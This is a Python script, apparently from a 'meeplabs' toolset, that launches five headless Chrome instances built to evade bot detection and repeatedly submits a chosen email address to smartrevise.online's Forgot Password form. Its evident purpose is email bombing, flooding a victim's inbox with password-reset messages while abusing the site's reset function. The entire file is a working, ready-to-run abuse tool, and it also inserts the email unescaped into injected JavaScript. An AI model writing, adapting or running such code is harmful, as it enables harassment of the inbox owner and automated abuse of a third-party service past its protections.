from termcolor import colored, cprint
from alive_progress import alive_bar
import threading
import os.path
import shutup
import time
import fade
import os

import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC


def clear():
    os.system("clear" if os.name == "posix" else "cls")


def resetPass(driver, bar, numQuestions, email):
    driver.get("https://smartrevise.online/Account/ForgotPassword")

    complete = 0
    while complete < numQuestions:
        try:
            elem = WebDriverWait(driver, 300).until(
                EC.presence_of_element_located((By.CLASS_NAME, "kt-content"))
            )
        except:
            pass
        finally:
            try:
                qC = driver.execute_script(
                    """
    function doAnswer() {
        if (location.href == "https://smartrevise.online/Account/ForgotPassword") {
            document.querySelector("#Email").value = '"""
                    + email
                    + """';
            document.querySelector("button[type='submit']").click();
            return 1;
        } else {
            setTimeout(() => { location.href = "https://smartrevise.online/Account/ForgotPassword"; }, 100);
        }
    }

    return (doAnswer() || 0);
    """
                )
                complete += qC or 0
                if qC == 1:
                    bar()
                elif qC != 0:
                    cprint("Unknown error", "red")
            except:
                pass

    time.sleep(2)


def logo():
    clear()
    print(
        fade.purplepink(
            """                                   
  ██████  ███▄ ▄███▓ ▄▄▄       ██▀███  ▄▄▄█████▓▓█████  ██▀███      ██▀███  ▓█████ ██▒   █▓ ██▓  ██████ ▓█████ 
▒██    ▒ ▓██▒▀█▀ ██▒▒████▄    ▓██ ▒ ██▒▓  ██▒ ▓▒▓█   ▀ ▓██ ▒ ██▒   ▓██ ▒ ██▒▓█   ▀▓██░   █▒▓██▒▒██    ▒ ▓█   ▀ 
░ ▓██▄   ▓██    ▓██░▒██  ▀█▄  ▓██ ░▄█ ▒▒ ▓██░ ▒░▒███   ▓██ ░▄█ ▒   ▓██ ░▄█ ▒▒███   ▓██  █▒░▒██▒░ ▓██▄   ▒███   
  ▒   ██▒▒██    ▒██ ░██▄▄▄▄██ ▒██▀▀█▄  ░ ▓██▓ ░ ▒▓█  ▄ ▒██▀▀█▄     ▒██▀▀█▄  ▒▓█  ▄  ▒██ █░░░██░  ▒   ██▒▒▓█  ▄ 
▒██████▒▒▒██▒   ░██▒ ▓█   ▓██▒░██▓ ▒██▒  ▒██▒ ░ ░▒████▒░██▓ ▒██▒   ░██▓ ▒██▒░▒████▒  ▒▀█░  ░██░▒██████▒▒░▒████▒
▒ ▒▓▒ ▒ ░░ ▒░   ░  ░ ▒▒   ▓▒█░░ ▒▓ ░▒▓░  ▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░   ░ ▒▓ ░▒▓░░░ ▒░ ░  ░ ▐░  ░▓  ▒ ▒▓▒ ▒ ░░░ ▒░ ░
░ ░▒  ░ ░░  ░      ░  ▒   ▒▒ ░  ░▒ ░ ▒░    ░     ░ ░  ░  ░▒ ░ ▒░     ░▒ ░ ▒░ ░ ░  ░  ░ ░░   ▒ ░░ ░▒  ░ ░ ░ ░  ░
░  ░  ░  ░      ░     ░   ▒     ░░   ░   ░         ░     ░░   ░      ░░   ░    ░       ░░   ▒ ░░  ░  ░     ░   
      ░         ░         ░  ░   ░                 ░  ░   ░           ░        ░  ░     ░   ░        ░     ░  ░
                                                                                       ░      m e e p l a b s                 
"""
        )
    )


def main(options):
    try:
        logo()
        cprint("Loading...", "blue")

        with shutup.mute_warnings:
            drivers = [
                uc.Chrome(options=options(), service_log_path=os.devnull),
                uc.Chrome(options=options(), service_log_path=os.devnull),
                uc.Chrome(options=options(), service_log_path=os.devnull),
                uc.Chrome(options=options(), service_log_path=os.devnull),
                uc.Chrome(options=options(), service_log_path=os.devnull),
            ]

        logo()
        cprint("Usage: <email>, <numEmails>\n", "green")

        c = input(colored("> ", "blue")).split(",")
        print()

        if not len(c) == 2:
            cprint("Invalid selection, exiting...", "red")
            raise KeyboardInterrupt

        email = c[0]
        num = int(c[1])

        if "@" not in email:
            cprint("Invalid selection, exiting...", "red")
            raise KeyboardInterrupt
        
        if num < len(drivers):
            cprint(f"Must be at least {len(drivers)} emails, exiting...", "red")
            raise KeyboardInterrupt

        threads = []
        with alive_bar(num) as bar:
            for i, driver in enumerate(drivers):
                threads.append(
                    threading.Thread(
                        target=resetPass,
                        args=(
                            driver,
                            bar,
                            num // len(drivers),
                            email,
                        ),
                    )
                )
                threads[i].start()
            threads[0].join()
        raise KeyboardInterrupt

    except KeyboardInterrupt:
        try:
            for driver in drivers:
                driver.close()
        except UnboundLocalError:
            print()


def getOptions():
    options = uc.ChromeOptions()
    options.add_argument("--disable-brave-extension")
    options.add_argument("--disable-infobars")
    options.add_argument("--disable-notifications")
    options.add_argument("--headless")
    options.add_argument("--disable-gpu")
    options.binary_location = (
        "C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe"
    )
    return options


def run():
    try:
        open("C:\\Program Files\\BraveSoftware\\Brave-Browser\\Application\\brave.exe")
    except:
        cprint("Brave not found! Install it to continue.", "red")
        exit()

    main(getOptions)
